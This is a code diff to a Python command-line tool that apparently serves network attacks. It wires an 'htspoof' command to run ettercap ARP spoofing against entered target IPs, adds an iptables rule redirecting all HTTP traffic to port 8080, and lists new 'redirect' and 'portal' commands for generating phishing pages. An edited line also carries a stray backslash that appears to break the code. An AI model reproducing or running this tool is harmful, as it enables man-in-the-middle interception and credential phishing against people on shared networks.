@@ -38,30 +38,36 @@ def main():
             with open('src/target.txt', 'a') as targetf:
                 targetnum = int(input("\n" " " "\u001b[34;1mEnter the number of targets: "))
                 for n in range(targetnum):
-                    targetip = input("\n" " " "\u001b[34;1mEnter the target IP address: ")
-                    targetf.write("/"+targetip+"//"+"\n")
+                    targetip = input("\n"" " "\u001b[34;1mEnter the target IP address: ") 
+                    targetf.write("/"+targetip+"//" "\n")
             print(" " "\n" " \u001b[35;1m[➔ Info]:" " \u001b[0mTarget IP has been set")
 
-            
-        def clear():
-            os.system("clear")                  
-            
         def htspoof():
             if os.path.getsize('src/target.txt') == 0:
                 print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
             else:
                 with open('src/target.txt', 'r') as targetf:
-                    print(" " "\u001b[35;1m[➔ Info]: " "Running ARP Spoofing...")
+                    print(" " "\u001b[35;1m[➔ Info]: " " Running ARP Spoofing...")
                     time.sleep(0.5)
                     ettercommand = ("sudo ettercap -Tq -M ARP")
                     with open('src/arp.txt','r') as arp:
-                        iplist = [ip for ip in targetf]
-                        ipstring = (' '.join(iplist))
+                        iplist = targetf.readlines()
+                        iplistformatted =[]
+                        for ip in iplist:
+                            iplistformatted.append(ip.replace("\n",""))
+                        ipstring = ' '.join([str(arpip) for arpip in iplistformatted])
                         print(ipstring)
-                        arp.write(ettercommand+ " "+ipstring)
+                        try:
+                            os.popen("sudo ettercap -Tq -M ARP "+ ipstring)\
+                        except:
+                            print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mPlease make sure that the IP exists and is formatted correctly!")
                             
 
-                    targetf.truncate(0)
+
+                print(" " "\u001b[35;1m[➔ Info]: " " Setting up iptables rules...")
+                os.popen("iptables -t nat -A PREROUTING -p TCP -j REDIRECT --destination-port 80 --to-port 8080").read() 
+                print(" " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1mhtspoof done!")
+                open('src/target.txt', 'w').close()
  
         def log():
             return "log"
@@ -78,6 +84,10 @@ def main():
                             \u001b[33;1mhtspoof - Redirect user to specific webpage
 
                             \u001b[33;1mlog - View the active log of current network
+
+                            \u001b[33;1mredirect - Set the redirection IP for all HTTP pages
+
+                            \u001b[33;1mportal - Generate phishing page/portal for redirection
                            
                            '''
             print(helpstr)  
